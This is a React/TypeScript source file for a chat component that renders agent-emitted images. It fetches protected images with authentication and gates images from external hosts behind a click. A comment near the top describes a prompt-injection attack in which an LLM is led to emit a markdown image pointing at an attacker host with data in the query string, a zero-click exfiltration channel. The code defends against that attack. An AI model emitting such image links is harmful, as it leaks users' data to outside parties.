'use client';
import { useT } from '@/lib/i18n/useT';

import { useEffect, useRef, useState } from 'react';
import { apiFetchBlob } from '@/lib/api/transport';
import { isProtectedDownloadUrl } from '@/lib/api/authenticated-download';
import { isFirstPartyUrl, toApiPath } from '@/lib/api/first-party';

interface AuthImageProps {
  src: string;
  alt?: string;
  className?: string;
}

/**
 * Chat-embedded image for protected download routes.
 *
 * A bare `<img src="/api/v1/export/download/...">` is a browser-native fetch
 * that cannot carry the Bearer header, so exported map images embedded by the
 * agent (`![地图](url)`) were broken images. This component fetches the blob
 * through the transport (auth + 401 refresh) and renders it from an object
 * URL. Public URLs (shared report views, external hosts) render directly.
 */
/**
 * F-08: images the LLM emits load automatically when a message renders, so a
 * prompt-injected `![](https://attacker/?q=<data>)` is a zero-click
 * exfiltration channel. Only first-party / same-origin (and blob:) images
 * render inline; any other host needs an explicit click-through.
 */
function isTrustedImageSrc(src: string): boolean {
  if (!src) return false;
  if (/^blob:/i.test(src)) return true;
  if (isFirstPartyUrl(src)) return true;
  if (typeof window === 'undefined' || !window.location?.origin) return false;
  try {
    return new URL(src, window.location.href).origin === window.location.origin;
  } catch {
    return false;
  }
}

function externalHost(src: string): string {
  try {
    return new URL(src).host || src;
  } catch {
    return src;
  }
}

export function AuthImage({ src, alt, className }: AuthImageProps) {
  const t = useT();
  const [externalApproved, setExternalApproved] = useState(false);
  const [objectUrl, setObjectUrl] = useState<string | null>(null);
  const [failed, setFailed] = useState(false);
  const objectUrlRef = useRef<string | null>(null);

  const needsAuth = isProtectedDownloadUrl(src);
  // apiFetchBlob's buildRequest prepends API_BASE — hand it the origin-
  // relative path (production builds use relative URLs with API_BASE === '').
  const path = needsAuth ? toApiPath(src) : src;

  useEffect(() => {
    if (!needsAuth) return;
    let cancelled = false;
    setFailed(false);
    setObjectUrl(null);
    apiFetchBlob(path)
      .then(({ blob }) => {
        if (cancelled) return;
        const url = URL.createObjectURL(blob);
        objectUrlRef.current = url;
        setObjectUrl(url);
      })
      .catch(() => {
        if (!cancelled) setFailed(true);
      });
    return () => {
      cancelled = true;
      if (objectUrlRef.current) {
        URL.revokeObjectURL(objectUrlRef.current);
        objectUrlRef.current = null;
      }
    };
  }, [path, needsAuth]);

  if (!needsAuth) {
    if (!isTrustedImageSrc(src) && !externalApproved) {
      return (
        <button
          type="button"
          data-testid="external-image-gate"
          onClick={() => setExternalApproved(true)}
          className="inline-block rounded-sm border border-edge-subtle px-2 py-1 text-xs text-ink-muted hover:text-ink-secondary"
        >
          {t('chat.externalImageBlocked', { host: externalHost(src) })}
          {alt ? ` · ${alt}` : ''}
        </button>
      );
    }
    // objectURL/blob and dynamic download URLs can't go through next/image.
    // eslint-disable-next-line @next/next/no-img-element
    return <img src={src} alt={alt ?? ''} className={className} referrerPolicy="no-referrer" />;
  }
  if (failed) {
    return (
      <span className="inline-block rounded-sm border border-edge-subtle px-2 py-1 text-xs text-ink-muted">
        {t('chat.authImageFailed')}
      </span>
    );
  }
  return objectUrl ? (
    // eslint-disable-next-line @next/next/no-img-element
    <img src={objectUrl} alt={alt ?? ''} className={className} />
  ) : (
    <span className="inline-block animate-pulse rounded-sm bg-surface-sunken px-2 py-1 text-xs text-ink-muted">
      {t('chat.authImageLoading')}
    </span>
  );
}
